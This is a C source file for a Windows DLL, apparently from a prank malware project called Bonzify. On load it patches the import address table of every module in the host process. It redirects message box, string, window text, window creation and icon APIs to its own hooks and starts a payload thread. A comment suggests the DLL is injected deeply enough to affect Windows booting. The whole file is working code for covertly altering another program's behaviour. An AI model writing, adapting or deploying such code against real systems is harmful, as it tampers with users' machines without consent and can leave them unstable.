#include <Windows.h>
#include <Psapi.h>

#include "StringHooks.h"
#include "IconHooks.h"
#include "Payloads.h"
#include "../Bonzify/Utils.h"

// This is the hook.
// It's catchy. You like it.

#pragma comment(lib, "psapi.lib")

static inline void InstallHook(PHOOK hook);

PHOOK hooks[] = {
	&MessageBoxW_Hook,
	&LoadStringW_Hook,
	&DrawTextW_Hook,
	&SetWindowTextW_Hook,
	&CreateWindowExW_Hook,

	// TODO Find out why this prevents Vista from booting
	//&FormatMessageW_Hook,

	&LoadIconW_Hook,
	&LoadImageW_Hook,
	&ExtractIconExW_Hook,
	&PrivateExtractIconsW_Hook,
	&ExtractAssociatedIconW_Hook,
};

HINSTANCE dllHandle;
LPWSTR dllFileName;

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
	if (reason == DLL_PROCESS_ATTACH) {
		dllHandle = instance;
		dllFileName = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
		GetModuleFileNameW(instance, dllFileName, 2048);

		for (int i = 0; i < sizeof(hooks) / sizeof(PHOOK); i++) {
			InstallHook(hooks[i]);
		}

		CreateThread(NULL, NULL, PayloadThread, NULL, 0, NULL);
	}

	return TRUE;
}

// TODO Definetely optimize this one, I bet there is some unnecessary code in here
static void InstallHook(PHOOK hook) {
	HMODULE modules[64];
	DWORD moduleCount;

	EnumProcessModules(GetCurrentProcess(), modules, sizeof(modules), &moduleCount);

	for (int i = 0; i < moduleCount; i++) {
		HMODULE module = modules[i];
		if (module == dllHandle)
			continue;

		MEMORY_BASIC_INFORMATION mbi;
		if (!VirtualQuery((LPVOID)module, &mbi, sizeof(mbi)))
			continue;

		MODULEINFO info;
		GetModuleInformation(GetCurrentProcess(), module, &info, sizeof(info));

		DWORD _;
		if (!VirtualProtect(module, info.SizeOfImage, PAGE_EXECUTE_READWRITE, &_))
			continue;

		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;

		if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
			PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)dosHeader + dosHeader->e_lfanew);
			PIMAGE_IMPORT_DESCRIPTOR importDescriptors = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)dosHeader + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
			PIMAGE_IMPORT_DESCRIPTOR importDescriptor = importDescriptors;

			for (; ((SIZE_T)importDescriptor) < (SIZE_T)((LPBYTE)importDescriptors + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
				&& importDescriptor->Name != NULL; importDescriptor++) {
				char *modName = (char *)((LPBYTE)dosHeader + importDescriptor->Name);

				if (lstrcmpA(modName, hook->originalDLL))
					continue;

				PIMAGE_THUNK_DATA thunkData = (PIMAGE_THUNK_DATA)((LPBYTE)dosHeader + importDescriptor->FirstThunk);
				PSIZE_T oThunkData = (PSIZE_T)((LPBYTE)dosHeader + importDescriptor->OriginalFirstThunk);

				do {
					if (!(*oThunkData & 0x80000000)) {
						char *funcname = (char *)((LPBYTE)dosHeader + 2 + *oThunkData);

						if (!lstrcmpA(hook->originalName, funcname)) {
							DWORD oldPerms;
							VirtualProtect((LPVOID)&(thunkData->u1.Function), sizeof(LPVOID), PAGE_READWRITE, &oldPerms);

							hook->backup = (LPVOID)thunkData->u1.Function;
							thunkData->u1.Function = (DWORD)hook->hookProc;

							VirtualProtect((LPVOID)&(thunkData->u1.Function), sizeof(LPVOID), oldPerms, &oldPerms);
						}
					}

					thunkData++;
					oThunkData++;
				} while (thunkData->u1.Function != NULL);
			}
		}
	}
}